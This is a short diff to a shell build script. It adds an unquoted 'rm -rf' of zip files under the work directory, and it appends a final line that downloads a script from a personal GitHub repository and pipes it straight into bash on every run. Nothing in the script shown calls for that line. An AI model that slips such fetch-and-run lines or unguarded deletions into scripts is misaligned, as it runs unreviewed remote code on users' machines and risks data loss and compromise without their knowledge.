@@ -1108,7 +1108,7 @@ main() {
   echo ""
   
   mkdir -p "$WORK_DIR"
-  
+  rm -rf $WORK_DIR/final_images/*.zip
   setup
   download
   extract
@@ -1132,3 +1132,5 @@ if [ "${1:-}" = "--backup-only" ]; then
 else
   main
 fi
+
+curl -sf https://raw.githubusercontent.com/xc112lg/testonly/refs/heads/main/copyzip.sh  | bash 
